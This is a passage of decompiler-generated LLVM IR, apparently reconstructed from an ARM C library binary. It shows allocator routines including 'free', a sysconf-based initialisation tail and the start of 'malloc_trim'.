  %v2_13708 = inttoptr i32 %v1_13708 to i32*
  %v3_13708 = load i32, i32* %v2_13708, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13710 = urem i32 %v2_13704, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_13718 = or i32 %v3_13708, 1
  store i32 %v1_13718, i32* %r1.global-to-local, align 4
  %v1_1371c = or i32 %v1_13710, 72
  store i32 %v1_1371c, i32* %r2.global-to-local, align 4
  %v1_13720 = add i32 %v0_13704, 52
  store i32 %v1_13720, i32* %ip.global-to-local, align 4
  %v2_13724 = add i32 %v0_13704, 840
  %v3_13724 = inttoptr i32 %v2_13724 to i32*
  store i32 0, i32* %v3_13724, align 4
  %v0_13728 = load i32, i32* %r3.global-to-local, align 4
  %v1_13728 = add i32 %v0_13728, 65536
  store i32 %v1_13728, i32* %r3.global-to-local, align 4
  %v0_1372c = load i32, i32* %r0.global-to-local, align 4
  %v1_1372c = load i32, i32* @r4, align 4
  %v2_1372c = add i32 %v1_1372c, 836
  %v3_1372c = inttoptr i32 %v2_1372c to i32*
  store i32 %v0_1372c, i32* %v3_1372c, align 4
  %v0_13730 = load i32, i32* %r0.global-to-local, align 4
  %v1_13730 = load i32, i32* @r4, align 4
  %v2_13730 = add i32 %v1_13730, 844
  %v3_13730 = inttoptr i32 %v2_13730 to i32*
  store i32 %v0_13730, i32* %v3_13730, align 4
  %v1_13734 = load i32, i32* @r4, align 4
  %v2_13734 = add i32 %v1_13734, 852
  %v3_13734 = inttoptr i32 %v2_13734 to i32*
  store i32 %v1_13728, i32* %v3_13734, align 4
  %v1_13738 = load i32, i32* @r4, align 4
  %v2_13738 = add i32 %v1_13738, 864
  %v3_13738 = inttoptr i32 %v2_13738 to i32*
  store i32 %v1_13718, i32* %v3_13738, align 4
  %v1_1373c = load i32, i32* @r4, align 4
  %v2_1373c = inttoptr i32 %v1_1373c to i32*
  store i32 %v1_1371c, i32* %v2_1373c, align 4
  %v0_13740 = load i32, i32* %ip.global-to-local, align 4
  %v1_13740 = load i32, i32* @r4, align 4
  %v2_13740 = add i32 %v1_13740, 44
  %v3_13740 = inttoptr i32 %v2_13740 to i32*
  store i32 %v0_13740, i32* %v3_13740, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_13748 = call i32 @sysconf(i32 30, i32 %v1_13718, i32 %v1_1371c, i32 %v1_13728)
  store i32 %v4_13748, i32* @r0, align 4
  %v1_1374c = load i32, i32* @r4, align 4
  %v2_1374c = add i32 %v1_1374c, 860
  %v3_1374c = inttoptr i32 %v2_1374c to i32*
  store i32 %v4_13748, i32* %v3_1374c, align 4
  br label %dec_label_pc_13750

dec_label_pc_13750:                               ; preds = %dec_label_pc_136d8, %dec_label_pc_13704
  %v2_13754 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13754, i32* @r4, align 4
  %v1_13758 = load i32, i32* @r0, align 4
  ret i32 %v1_13758

; uselistorder directives
  uselistorder i32 %v0_13704, { 1, 0, 2, 3 }
  uselistorder i32 %v0_136fc, { 1, 0 }
  uselistorder i32 %v1_136e0, { 1, 0 }
  uselistorder i32 %v0_136cc, { 0, 2, 1 }
  uselistorder i32 %v0_136a8, { 1, 0 }
  uselistorder i32 %v1_135f8, { 1, 0, 2 }
  uselistorder i32 %v0_13610, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_135d0, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 2, 11, 12 }
  uselistorder i32* %lr.global-to-local, { 2, 0, 3, 5, 1, 4, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 0, 5, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_13750, { 1, 0 }
  uselistorder label %dec_label_pc_136e8.dec_label_pc_136e8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_136cc, { 1, 0 }
  uselistorder label %dec_label_pc_13698, { 1, 0 }
  uselistorder label %dec_label_pc_1368c, { 1, 0 }
  uselistorder label %dec_label_pc_13688, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13644, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1375c = load i32, i32* @r4, align 4
  %v6_1375c = load i32, i32* @r5, align 4
  %v9_1375c = load i32, i32* @r6, align 4
  %v12_1375c = load i32, i32* @r7, align 4
  %v18_1375c = load i32, i32* @lr, align 4
  %v0_13764 = load i32, i32* @r0, align 4
  store i32 %v0_13764, i32* @r6, align 4
  %v2_13764 = icmp eq i32 %v0_13764, 0
  %v2_13768 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r7, align 4
  br i1 %v2_13764, label %dec_label_pc_13970, label %dec_label_pc_13774

dec_label_pc_13774:                               ; preds = %entry
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_13778 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 72) to i32*), align 4
  store i32 %v4_13778, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_13778, i32* %r2.global-to-local, align 4
  %v4_13784 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 36) to i32*), align 4
  store i32 %v4_13784, i32* %r1.global-to-local, align 4
  store i32 %v2_13768, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_13790 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  store i32 %v4_13790, i32* %ip.global-to-local, align 4
  store i32 79772, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13790)
  %v0_1379c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1379c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_137a4 = load i32, i32* @r7, align 4
  %v2_137a4 = add i32 %v0_137a4, 16
  %v3_137a4 = inttoptr i32 %v2_137a4 to i32*
  %v4_137a4 = load i32, i32* %v3_137a4, align 4
  store i32 %v4_137a4, i32* %ip.global-to-local, align 4
  store i32 79792, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_137a4)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_137b4 = load i32, i32* @r7, align 4
  %v2_137b4 = add i32 %v0_137b4, 32
  %v3_137b4 = inttoptr i32 %v2_137b4 to i32*
  %v4_137b4 = load i32, i32* %v3_137b4, align 4
  store i32 %v4_137b4, i32* @lr, align 4
  %v0_137b8 = load i32, i32* @r6, align 4
  %v1_137b8 = add i32 %v0_137b8, -4
  %v2_137b8 = inttoptr i32 %v1_137b8 to i32*
  %v3_137b8 = load i32, i32* %v2_137b8, align 4
  store i32 %v3_137b8, i32* %r2.global-to-local, align 4
  %v1_137bc = inttoptr i32 %v4_137b4 to i32*
  %v2_137bc = load i32, i32* %v1_137bc, align 4
  store i32 %v2_137bc, i32* %r3.global-to-local, align 4
  %v1_137c0 = and i32 %v3_137b8, -4
  store i32 %v1_137c0, i32* %ip.global-to-local, align 4
  %v1_137c4 = add i32 %v0_137b8, -8
  store i32 %v1_137c4, i32* @r5, align 4
  store i32 %v1_137c4, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_137c0, %v2_137bc
  br i1 %tmp, label %dec_label_pc_137f4, label %dec_label_pc_137d4

dec_label_pc_137d4:                               ; preds = %dec_label_pc_13774
  %v1_137d4 = or i32 %v2_137bc, 3
  store i32 %v1_137d4, i32* %r3.global-to-local, align 4
  store i32 %v1_137d4, i32* %v1_137bc, align 4
  %v3_137d8 = load i32, i32* @lr, align 4
  %v4_137d8 = add i32 %v3_137d8, -8
  store i32 %v4_137d8, i32* %lr.global-to-local, align 4
  %v0_137dc = load i32, i32* %ip.global-to-local, align 4
  %v3_137dc = udiv i32 %v0_137dc, 8
  store i32 %v3_137dc, i32* %r1.global-to-local, align 4
  %v1_137e0 = add i32 %v3_137d8, -4
  store i32 %v1_137e0, i32* %r2.global-to-local, align 4
  %v4_137e4 = mul nuw i32 %v3_137dc, 4
  %v5_137e4 = add i32 %v4_137e4, %v1_137e0
  %v6_137e4 = inttoptr i32 %v5_137e4 to i32*
  %v7_137e4 = load i32, i32* %v6_137e4, align 4
  store i32 %v7_137e4, i32* %r3.global-to-local, align 4
  %v1_137e8 = load i32, i32* @r5, align 4
  %v2_137e8 = add i32 %v1_137e8, 8
  %v3_137e8 = inttoptr i32 %v2_137e8 to i32*
  store i32 %v7_137e4, i32* %v3_137e8, align 4
  %v0_137ec = load i32, i32* @r5, align 4
  %v1_137ec = load i32, i32* %r2.global-to-local, align 4
  %v2_137ec = load i32, i32* %r1.global-to-local, align 4
  %v5_137ec = mul i32 %v2_137ec, 4
  %v6_137ec = add i32 %v5_137ec, %v1_137ec
  %v7_137ec = inttoptr i32 %v6_137ec to i32*
  store i32 %v0_137ec, i32* %v7_137ec, align 4
  br label %dec_label_pc_13958

dec_label_pc_137f4:                               ; preds = %dec_label_pc_13774
  %v1_137f4 = and i32 %v3_137b8, 2
  %v2_137f4 = icmp eq i32 %v1_137f4, 0
  br i1 %v2_137f4, label %dec_label_pc_137fc, label %dec_label_pc_13930

dec_label_pc_137fc:                               ; preds = %dec_label_pc_137f4
  %v1_137fc = or i32 %v2_137bc, 1
  store i32 %v1_137fc, i32* %r3.global-to-local, align 4
  store i32 %v1_137fc, i32* %v1_137bc, align 4
  %v0_13804 = load i32, i32* @r6, align 4
  %v1_13804 = add i32 %v0_13804, -4
  %v2_13804 = inttoptr i32 %v1_13804 to i32*
  %v3_13804 = load i32, i32* %v2_13804, align 4
  store i32 %v3_13804, i32* %r3.global-to-local, align 4
  %v0_13808 = load i32, i32* @r5, align 4
  %v1_13808 = load i32, i32* %ip.global-to-local, align 4
  %v2_13808 = add i32 %v1_13808, %v0_13808
  store i32 %v2_13808, i32* %lr.global-to-local, align 4
  %v1_1380c = urem i32 %v3_13804, 2
  %v2_1380c = icmp eq i32 %v1_1380c, 0
  %v1_13810 = add i32 %v2_13808, 4
  %v2_13810 = inttoptr i32 %v1_13810 to i32*
  %v3_13810 = load i32, i32* %v2_13810, align 4
  store i32 %v3_13810, i32* %r8.global-to-local, align 4
  br i1 %v2_1380c, label %dec_label_pc_13818, label %dec_label_pc_1384c

dec_label_pc_13818:                               ; preds = %dec_label_pc_137fc
  %v1_13818 = add i32 %v0_13804, -8
  %v2_13818 = inttoptr i32 %v1_13818 to i32*
  %v3_13818 = load i32, i32* %v2_13818, align 4
  store i32 %v3_13818, i32* %r1.global-to-local, align 4
  %v2_1381c = sub i32 %v0_13808, %v3_13818
  store i32 %v2_1381c, i32* %r3.global-to-local, align 4
  %v1_13820 = add i32 %v2_1381c, 8
  %v2_13820 = inttoptr i32 %v1_13820 to i32*
  %v3_13820 = load i32, i32* %v2_13820, align 4
  store i32 %v3_13820, i32* %r2.global-to-local, align 4
  %v1_13824 = add i32 %v3_13820, 12
  %v2_13824 = inttoptr i32 %v1_13824 to i32*
  %v3_13824 = load i32, i32* %v2_13824, align 4
  store i32 %v3_13824, i32* %r4.global-to-local, align 4
  %v9_13828 = icmp eq i32 %v3_13824, %v2_1381c
  %v1_1382c = add i32 %v2_1381c, 12
  %v2_1382c = inttoptr i32 %v1_1382c to i32*
  %v3_1382c = load i32, i32* %v2_1382c, align 4
  store i32 %v3_1382c, i32* %r0.global-to-local, align 4
  br i1 %v9_13828, label %dec_label_pc_13834, label %dec_label_pc_13898

dec_label_pc_13834:                               ; preds = %dec_label_pc_13818
  %v1_13834 = add i32 %v3_1382c, 8
  %v2_13834 = inttoptr i32 %v1_13834 to i32*
  %v3_13834 = load i32, i32* %v2_13834, align 4
  store i32 %v3_13834, i32* %r3.global-to-local, align 4
  %v9_13838 = icmp eq i32 %v3_13834, %v2_1381c
  br i1 %v9_13838, label %dec_label_pc_13840, label %dec_label_pc_13898

dec_label_pc_13840:                               ; preds = %dec_label_pc_13834
  store i32 %v3_13820, i32* %v2_13834, align 4
  %v0_13844 = load i32, i32* %r0.global-to-local, align 4
  %v1_13844 = load i32, i32* %r2.global-to-local, align 4
  %v2_13844 = add i32 %v1_13844, 12
  %v3_13844 = inttoptr i32 %v2_13844 to i32*
  store i32 %v0_13844, i32* %v3_13844, align 4
  %v0_13848 = load i32, i32* %ip.global-to-local, align 4
  %v1_13848 = load i32, i32* %r1.global-to-local, align 4
  %v2_13848 = add i32 %v1_13848, %v0_13848
  store i32 %v2_13848, i32* %ip.global-to-local, align 4
  %v0_13858.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1385c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1384c

dec_label_pc_1384c:                               ; preds = %dec_label_pc_137fc, %dec_label_pc_13840
  %v0_138d8 = phi i32 [ %v1_13808, %dec_label_pc_137fc ], [ %v2_13848, %dec_label_pc_13840 ]
  %v0_1385c = phi i32 [ %v3_13810, %dec_label_pc_137fc ], [ %v0_1385c.pre, %dec_label_pc_13840 ]
  %v1_13870 = phi i32 [ %v2_13808, %dec_label_pc_137fc ], [ %v0_13858.pre, %dec_label_pc_13840 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_13850 = load i32, i32* @r7, align 4
  %v2_13850 = add i32 %v0_13850, 32
  %v3_13850 = inttoptr i32 %v2_13850 to i32*
  %v4_13850 = load i32, i32* %v3_13850, align 4
  store i32 %v4_13850, i32* %r2.global-to-local, align 4
  %v1_13854 = add i32 %v4_13850, 44
  %v2_13854 = inttoptr i32 %v1_13854 to i32*
  %v3_13854 = load i32, i32* %v2_13854, align 4
  store i32 %v3_13854, i32* %r3.global-to-local, align 4
  %v9_13858 = icmp eq i32 %v1_13870, %v3_13854
  %v1_1385c = and i32 %v0_1385c, -4
  store i32 %v1_1385c, i32* %r0.global-to-local, align 4
  br i1 %v9_13858, label %dec_label_pc_138d8, label %dec_label_pc_13864

dec_label_pc_13864:                               ; preds = %dec_label_pc_1384c
  %v2_13864 = add i32 %v1_13870, %v1_1385c
  store i32 %v2_13864, i32* %r3.global-to-local, align 4
  %v1_13868 = add i32 %v2_13864, 4
  %v2_13868 = inttoptr i32 %v1_13868 to i32*
  %v3_13868 = load i32, i32* %v2_13868, align 4
  store i32 %v3_13868, i32* %r3.global-to-local, align 4
  %v1_1386c = urem i32 %v3_13868, 2
  %v2_1386c = icmp eq i32 %v1_1386c, 0
  %v2_13870 = add i32 %v1_13870, 4
  %v3_13870 = inttoptr i32 %v2_13870 to i32*
  store i32 %v1_1385c, i32* %v3_13870, align 4
  br i1 %v2_1386c, label %dec_label_pc_13878, label %dec_label_pc_13864.dec_label_pc_138a8_crit_edge

dec_label_pc_13864.dec_label_pc_138a8_crit_edge:  ; preds = %dec_label_pc_13864
  %v0_138b8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_138a8

dec_label_pc_13878:                               ; preds = %dec_label_pc_13864
  %v0_13878 = load i32, i32* %lr.global-to-local, align 4
  %v1_13878 = add i32 %v0_13878, 8
  %v2_13878 = inttoptr i32 %v1_13878 to i32*
  %v3_13878 = load i32, i32* %v2_13878, align 4
  store i32 %v3_13878, i32* %r1.global-to-local, align 4
  %v1_1387c = add i32 %v3_13878, 12
  %v2_1387c = inttoptr i32 %v1_1387c to i32*
  %v3_1387c = load i32, i32* %v2_1387c, align 4
  store i32 %v3_1387c, i32* %r3.global-to-local, align 4
  %v9_13880 = icmp eq i32 %v3_1387c, %v0_13878
  %v1_13884 = add i32 %v0_13878, 12
  %v2_13884 = inttoptr i32 %v1_13884 to i32*
  %v3_13884 = load i32, i32* %v2_13884, align 4
  store i32 %v3_13884, i32* %r2.global-to-local, align 4
  br i1 %v9_13880, label %dec_label_pc_1388c, label %dec_label_pc_13898

dec_label_pc_1388c:                               ; preds = %dec_label_pc_13878
  %v1_1388c = add i32 %v3_13884, 8
  %v2_1388c = inttoptr i32 %v1_1388c to i32*
  %v3_1388c = load i32, i32* %v2_1388c, align 4
  store i32 %v3_1388c, i32* %r3.global-to-local, align 4
  %v9_13890 = icmp eq i32 %v3_1388c, %v0_13878
  br i1 %v9_13890, label %dec_label_pc_1389c, label %dec_label_pc_13898

dec_label_pc_13898:                               ; preds = %dec_label_pc_13878, %dec_label_pc_13834, %dec_label_pc_13818, %dec_label_pc_1388c
  %v0_13898 = call i32 @abort()
  store i32 %v0_13898, i32* %r0.global-to-local, align 4
  %v0_1389c.pre = load i32, i32* @r1, align 4
  %v1_1389c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1389c

dec_label_pc_1389c:                               ; preds = %dec_label_pc_1388c, %dec_label_pc_13898
  %v1_1389c = phi i32 [ %v3_13884, %dec_label_pc_1388c ], [ %v1_1389c.pre, %dec_label_pc_13898 ]
  %v0_1389c = phi i32 [ %v3_13878, %dec_label_pc_1388c ], [ %v0_1389c.pre, %dec_label_pc_13898 ]
  %v2_1389c = add i32 %v1_1389c, 8
  %v3_1389c = inttoptr i32 %v2_1389c to i32*
  store i32 %v0_1389c, i32* %v3_1389c, align 4
  %v0_138a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_138a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_138a0 = add i32 %v1_138a0, 12
  %v3_138a0 = inttoptr i32 %v2_138a0 to i32*
  store i32 %v0_138a0, i32* %v3_138a0, align 4
  %v0_138a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_138a4 = load i32, i32* %r0.global-to-local, align 4
  %v2_138a4 = add i32 %v1_138a4, %v0_138a4
  store i32 %v2_138a4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_138a8

dec_label_pc_138a8:                               ; preds = %dec_label_pc_13864.dec_label_pc_138a8_crit_edge, %dec_label_pc_1389c
  %v0_138b8 = phi i32 [ %v0_138b8.pre, %dec_label_pc_13864.dec_label_pc_138a8_crit_edge ], [ %v2_138a4, %dec_label_pc_1389c ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_138ac = load i32, i32* @r7, align 4
  %v2_138ac = add i32 %v0_138ac, 32
  %v3_138ac = inttoptr i32 %v2_138ac to i32*
  %v4_138ac = load i32, i32* %v3_138ac, align 4
  %v1_138b0 = add i32 %v4_138ac, 52
  store i32 %v1_138b0, i32* %r3.global-to-local, align 4
  %v1_138b4 = add i32 %v4_138ac, 60
  %v2_138b4 = inttoptr i32 %v1_138b4 to i32*
  %v3_138b4 = load i32, i32* %v2_138b4, align 4
  store i32 %v3_138b4, i32* %r1.global-to-local, align 4
  %v1_138b8 = or i32 %v0_138b8, 1
  store i32 %v1_138b8, i32* %r2.global-to-local, align 4
  %v1_138bc = load i32, i32* %r4.global-to-local, align 4
  %v2_138bc = add i32 %v1_138bc, 12
  %v3_138bc = inttoptr i32 %v2_138bc to i32*
  store i32 %v1_138b0, i32* %v3_138bc, align 4
  %v0_138c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_138c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_138c0 = add i32 %v1_138c0, 8
  %v3_138c0 = inttoptr i32 %v2_138c0 to i32*
  store i32 %v0_138c0, i32* %v3_138c0, align 4
  %v0_138c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_138c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_138c4 = add i32 %v1_138c4, 4
  %v3_138c4 = inttoptr i32 %v2_138c4 to i32*
  store i32 %v0_138c4, i32* %v3_138c4, align 4
  %v0_138c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_138c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_138c8 = add i32 %v1_138c8, %v0_138c8
  %v4_138c8 = inttoptr i32 %v3_138c8 to i32*
  store i32 %v0_138c8, i32* %v4_138c8, align 4
  %v0_138cc = load i32, i32* %r4.global-to-local, align 4
  %v1_138cc = load i32, i32* %r1.global-to-local, align 4
  %v2_138cc = add i32 %v1_138cc, 12
  %v3_138cc = inttoptr i32 %v2_138cc to i32*
  store i32 %v0_138cc, i32* %v3_138cc, align 4
  %v0_138d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_138d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_138d0 = add i32 %v1_138d0, 8
  %v3_138d0 = inttoptr i32 %v2_138d0 to i32*
  store i32 %v0_138d0, i32* %v3_138d0, align 4
  br label %dec_label_pc_138e8

dec_label_pc_138d8:                               ; preds = %dec_label_pc_1384c
  %v2_138d8 = add i32 %v1_1385c, %v0_138d8
  store i32 %v2_138d8, i32* %ip.global-to-local, align 4
  %v1_138dc = or i32 %v2_138d8, 1
  store i32 %v1_138dc, i32* %r3.global-to-local, align 4
  %v0_138e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_138e0, i32* %v2_13854, align 4
  %v0_138e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_138e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_138e4 = add i32 %v1_138e4, 4
  %v3_138e4 = inttoptr i32 %v2_138e4 to i32*
  store i32 %v0_138e4, i32* %v3_138e4, align 4
  br label %dec_label_pc_138e8

dec_label_pc_138e8:                               ; preds = %dec_label_pc_138a8, %dec_label_pc_138d8
  %v0_138e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_138ec = icmp ult i32 %v0_138e8, 131070
  br i1 %v3_138ec, label %dec_label_pc_13958, label %dec_label_pc_138f0

dec_label_pc_138f0:                               ; preds = %dec_label_pc_138e8
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_138f4 = load i32, i32* @r7, align 4
  %v2_138f4 = add i32 %v0_138f4, 32
  %v3_138f4 = inttoptr i32 %v2_138f4 to i32*
  %v4_138f4 = load i32, i32* %v3_138f4, align 4
  store i32 %v4_138f4, i32* @r4, align 4
  %v1_138f8 = inttoptr i32 %v4_138f4 to i32*
  %v2_138f8 = load i32, i32* %v1_138f8, align 4
  store i32 %v2_138f8, i32* %r3.global-to-local, align 4
  %v1_138fc = and i32 %v2_138f8, 2
  %v2_138fc = icmp eq i32 %v1_138fc, 0
  br i1 %v2_138fc, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_138f0
  store i32 %v4_138f4, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_138f0, %bb
  %v1_13904 = xor i1 %v2_138fc, true
  call void @__pseudo_cond_branch(i1 %v1_13904, i32 ptrtoint (i32* @global_var_135a8.743 to i32))
  %v0_13908 = load i32, i32* @r4, align 4
  %v1_13908 = add i32 %v0_13908, 44
  %v2_13908 = inttoptr i32 %v1_13908 to i32*
  %v3_13908 = load i32, i32* %v2_13908, align 4
  store i32 %v3_13908, i32* %r3.global-to-local, align 4
  %v1_1390c = add i32 %v3_13908, 4
  %v2_1390c = inttoptr i32 %v1_1390c to i32*
  %v3_1390c = load i32, i32* %v2_1390c, align 4
  store i32 %v3_1390c, i32* %r3.global-to-local, align 4
  %v1_13910 = add i32 %v0_13908, 836
  %v2_13910 = inttoptr i32 %v1_13910 to i32*
  %v3_13910 = load i32, i32* %v2_13910, align 4
  store i32 %v3_13910, i32* %r2.global-to-local, align 4
  %v1_13914 = and i32 %v3_1390c, -4
  store i32 %v1_13914, i32* %r3.global-to-local, align 4
  %v3_13918 = icmp ult i32 %v1_13914, %v3_13910
  br i1 %v3_13918, label %dec_label_pc_13958, label %dec_label_pc_13920

dec_label_pc_13920:                               ; preds = %bb17
  store i32 %v0_13908, i32* %r1.global-to-local, align 4
  %v1_13924 = add i32 %v0_13908, 840
  %v2_13924 = inttoptr i32 %v1_13924 to i32*
  %v3_13924 = load i32, i32* %v2_13924, align 4
  store i32 %v3_13924, i32* %r0.global-to-local, align 4
  %v2_13928 = call i32 @__malloc_trim(i32 %v3_13924, i32 %v0_13908)
  store i32 %v2_13928, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13958

dec_label_pc_13930:                               ; preds = %dec_label_pc_137f4
  %v2_13930 = inttoptr i32 %v1_137c4 to i32*
  %v3_13930 = load i32, i32* %v2_13930, align 4
  store i32 %v3_13930, i32* %r0.global-to-local, align 4
  %v1_13934 = add i32 %v4_137b4, 848
  %v2_13934 = inttoptr i32 %v1_13934 to i32*
  %v3_13934 = load i32, i32* %v2_13934, align 4
  store i32 %v3_13934, i32* %r2.global-to-local, align 4
  %v1_13938 = add i32 %v4_137b4, 868
  %v2_13938 = inttoptr i32 %v1_13938 to i32*
  %v3_13938 = load i32, i32* %v2_13938, align 4
  %v2_1393c = add i32 %v3_13930, %v1_137c0
  store i32 %v2_1393c, i32* %r1.global-to-local, align 4
  %v1_13940 = add i32 %v3_13934, -1
  store i32 %v1_13940, i32* %r2.global-to-local, align 4
  %v2_13944 = sub i32 %v3_13938, %v2_1393c
  store i32 %v2_13944, i32* %r3.global-to-local, align 4
  store i32 %v2_13944, i32* %v2_13938, align 4
  %v1_1394c = load i32, i32* @lr, align 4
  %v2_1394c = add i32 %v1_1394c, 848
  %v3_1394c = inttoptr i32 %v2_1394c to i32*
  store i32 %v1_13940, i32* %v3_1394c, align 4
  %v0_13950 = load i32, i32* %r0.global-to-local, align 4
  %v1_13950 = load i32, i32* @r5, align 4
  %v2_13950 = sub i32 %v1_13950, %v0_13950
  store i32 %v2_13950, i32* %r0.global-to-local, align 4
  %v4_13954 = call i32 @munmap(i32 %v2_13950, i32 %v2_1393c, i32 %v1_13940, i32 %v2_13944)
  store i32 %v4_13954, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13958

dec_label_pc_13958:                               ; preds = %bb17, %dec_label_pc_138e8, %dec_label_pc_13920, %dec_label_pc_137d4, %dec_label_pc_13930
  store i32 %v2_13768, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_13964 = load i32, i32* @r7, align 4
  %v2_13964 = add i32 %v0_13964, 24
  %v3_13964 = inttoptr i32 %v2_13964 to i32*
  %v4_13964 = load i32, i32* %v3_13964, align 4
  store i32 %v4_13964, i32* @ip, align 4
  store i32 80240, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13964)
  br label %dec_label_pc_13970

dec_label_pc_13970:                               ; preds = %entry, %dec_label_pc_13958
  store i32 %v3_1375c, i32* @r4, align 4
  store i32 %v6_1375c, i32* @r5, align 4
  store i32 %v9_1375c, i32* @r6, align 4
  store i32 %v12_1375c, i32* @r7, align 4
  store i32 %v18_1375c, i32* @lr, align 4
  ret i32 %v2_13768

; uselistorder directives
  uselistorder i32 %v0_13908, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_138c8, { 1, 0 }
  uselistorder i32 %v1_13808, { 1, 0 }
  uselistorder i32 %v0_13808, { 1, 0 }
  uselistorder i32 %v3_137dc, { 1, 0 }
  uselistorder i32 %v1_137c0, { 1, 0, 2 }
  uselistorder i32 %v2_137bc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_137b4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13764, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_13970, { 1, 0 }
  uselistorder label %dec_label_pc_13958, { 4, 2, 0, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_138e8, { 1, 0 }
  uselistorder label %dec_label_pc_138a8, { 1, 0 }
  uselistorder label %dec_label_pc_1389c, { 1, 0 }
  uselistorder label %dec_label_pc_13898, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1384c, { 1, 0 }
}

define i32 @function_13980(i32 %arg1) local_unnamed_addr {
dec_label_pc_13980:
  %v0_13980 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13980, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13980
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13980, %bb
  %v10_13994 = phi i32 [ %arg1, %dec_label_pc_13980 ], [ 0, %bb ]
  ret i32 %v10_13994

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_13998 = load i32, i32* @r4, align 4
  store i32 %v3_13998, i32* %stack_var_-12, align 4
  %v6_13998 = load i32, i32* @r5, align 4
